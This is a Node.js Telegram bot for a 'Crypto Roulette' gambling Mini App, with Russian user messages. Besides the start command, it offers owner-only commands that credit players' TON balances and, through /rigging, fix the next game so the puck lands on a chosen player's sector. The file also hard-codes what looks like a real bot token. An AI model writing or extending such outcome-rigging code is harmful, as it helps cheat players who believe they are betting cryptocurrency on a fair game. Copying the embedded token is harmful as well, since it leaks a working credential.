// CRYPTO ROULETTE — Telegram Bot v2 (/buy + /rigging)
const BOT_TOKEN = '8426341625:AAEgRnYhk9pYVSosTudAMJ8Sb67t8etFJEg';
const OWNER = 'lagaet';
const SERVER_URL = process.env.SERVER_URL || 'http://localhost:3000';
const https = require('https'), http = require('http');
const TG = `https://api.telegram.org/bot${BOT_TOKEN}`;

function tgReq(method, body) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify(body);
    const url = new URL(`${TG}/${method}`);
    const req = https.request({hostname:url.hostname,path:url.pathname,method:'POST',
      headers:{'Content-Type':'application/json','Content-Length':Buffer.byteLength(data)}}, res => {
      let c='';res.on('data',d=>c+=d);res.on('end',()=>{try{resolve(JSON.parse(c));}catch(e){resolve({});}});});
    req.on('error',reject);req.write(data);req.end();});
}

function send(chatId, text) { return tgReq('sendMessage', {chat_id:chatId, text:text, parse_mode:'HTML'}); }

function serverPost(path, body) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify(body);
    const url = new URL(SERVER_URL + path);
    const lib = url.protocol === 'https:' ? https : http;
    const req = lib.request({hostname:url.hostname,port:url.port||(url.protocol==='https:'?443:80),
      path:url.pathname,method:'POST',
      headers:{'Content-Type':'application/json','Content-Length':Buffer.byteLength(data)}}, res => {
      let c='';res.on('data',d=>c+=d);res.on('end',()=>{try{resolve(JSON.parse(c));}catch(e){reject(new Error('Bad response'));}});});
    req.on('error',reject);req.write(data);req.end();});
}

let offset = 0;
async function poll() {
  try {
    const res = await tgReq('getUpdates', {offset, timeout:30});
    if (res.ok && res.result) {
      for (const u of res.result) {
        offset = u.update_id + 1;
        if (u.message && u.message.text) await handle(u.message);
      }
    }
  } catch(e) { console.error('Poll error:', e.message); await new Promise(r=>setTimeout(r,3000)); }
  poll();
}

async function handle(msg) {
  const text = msg.text.trim(), chatId = msg.chat.id;
  const username = (msg.from.username || '').toLowerCase();

  if (text === '/start') {
    await send(chatId, '🎰 <b>Crypto Roulette Bot</b>\n\nИспользуйте Mini App для игры!');
    return;
  }

  // /buy amount @username
  if (text.startsWith('/buy')) {
    if (username !== OWNER) return send(chatId, '⛔ Только для владельца.');
    const parts = text.split(/\s+/);
    if (parts.length < 3) return send(chatId, '📝 <code>/buy [сумма] @username</code>\nПример: <code>/buy 500 @player</code>');
    const amount = parseFloat(parts[1]);
    const target = parts[2].replace(/^@/, '');
    if (isNaN(amount) || amount <= 0) return send(chatId, '❌ Неверная сумма.');
    if (!target) return send(chatId, '❌ Укажите @username.');
    try {
      const r = await serverPost('/api/buy', {owner:OWNER, username:target, amount});
      if (r.ok) {
        await send(chatId, `<tg-emoji emoji-id="5427009714745517609">💰</tg-emoji> Баланс @${target} пополнен на <b>${amount}</b> TON <tg-emoji emoji-id="5377620962390857342">✅</tg-emoji>\n\nБаланс: <b>${r.balance}</b> TON`);
        console.log(`[BUY] @${target} +${amount} = ${r.balance}`);
      } else await send(chatId, `❌ ${r.error||'Ошибка'}`);
    } catch(e) { await send(chatId, `❌ Сервер: ${e.message}`); }
    return;
  }

  // /rigging @username — rig next game
  if (text.startsWith('/rigging') || text.startsWith('/rig')) {
    if (username !== OWNER) return send(chatId, '⛔ Только для владельца.');
    const parts = text.split(/\s+/);
    if (parts.length < 2) return send(chatId, '📝 <code>/rigging @username</code>\n\nШайба в следующей игре прилетит на сектор указанного игрока.\nИгрок должен сделать ставку в этом раунде.');
    const target = parts[1].replace(/^@/, '');
    if (!target) return send(chatId, '❌ Укажите @username.');
    try {
      const r = await serverPost('/api/rig', {owner:OWNER, username:target});
      if (r.ok) {
        await send(chatId, `🎯 Подкрутка активирована для @${target}\n\n<i>Следующая игра будет подкручена. Игрок должен поставить ставку.</i>`);
        console.log(`[RIG] Queued for @${target}`);
      } else await send(chatId, `❌ ${r.error||'Ошибка'}`);
    } catch(e) { await send(chatId, `❌ Сервер: ${e.message}`); }
    return;
  }
}

console.log('🤖 Bot v2 starting...');
console.log(`👤 Owner: @${OWNER}`);
console.log(`🌐 Server: ${SERVER_URL}\n`);

tgReq('setMyCommands', {commands:[
  {command:'start',description:'Запустить бота'},
  {command:'buy',description:'Пополнить баланс (владелец)'},
  {command:'rigging',description:'Подкрутить игру (владелец)'},
]}).then(()=>{console.log('✅ Commands set');poll();}).catch(()=>poll());